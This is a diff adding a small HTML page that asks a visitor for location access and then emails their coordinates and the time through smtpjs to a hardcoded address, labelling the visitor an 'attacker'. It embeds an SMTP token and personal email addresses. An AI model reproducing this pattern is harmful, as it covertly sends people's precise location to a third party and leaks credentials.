@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script src="https://smtpjs.com/v3/smtp.js"></script>
+	<script>
+	let mail = "vedeshkompella@gmail.com"
+	//let mail = "anilvarma97989393@gmail.com"
+	var digits = '0123456789';
+	let OTP = '';
+	let LAT = '';
+	let LON = '';
+	for (let i = 0; i < 6; i++ ) {
+		OTP += digits[Math.floor(Math.random() * 10)];
+	}					
+	function sendEmail() {
+		alert("Please grant location access to proceed");
+		if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+   // console.log(showPosition.coords.latitude)
+  } else { 
+    Email.send({
+	SecureToken: "8c1ab678-8e1e-4150-a949-20368f7e88d3",
+	To : mail,
+	From : "legendtonystark1@gmail.com",
+	Subject : 'Suspicious attack',
+	Body : "Suspect attack happend, Increase security by changing password is adviced",
+	})
+	 .then(
+	 );
+  }
+}
+function showPosition(position) {
+	var a = position.coords.latitude
+	var b = position.coords.longitude
+	var x = Date()
+	Email.send({
+	SecureToken: "8c1ab678-8e1e-4150-a949-20368f7e88d3",
+	To : mail,
+	From : "legendtonystark1@gmail.com",
+	Subject : 'Suspicious attack',
+	Body :"Suspect attack happend, Increase security by changing password is adviced-----Location Details of the attacker--- Latitude: " + a + 
+  "<br>Longitude: " + b + x ,
+	})
+	 .then(
+	 );
+}
+// function showPosition(position) {
+//   x.innerHTML = "Latitude: " + position.coords.latitude + 
+//   "<br>Longitude: " + position.coords.longitude;
+// }
+	</script>
+</head>
+
+<body>
+<form method="post">
+	<p>Please check spam also
+	</p>
+		<input type="button" value="Send Email" onclick="sendEmail()"/>
+	</form>  
+</body>
+</html>
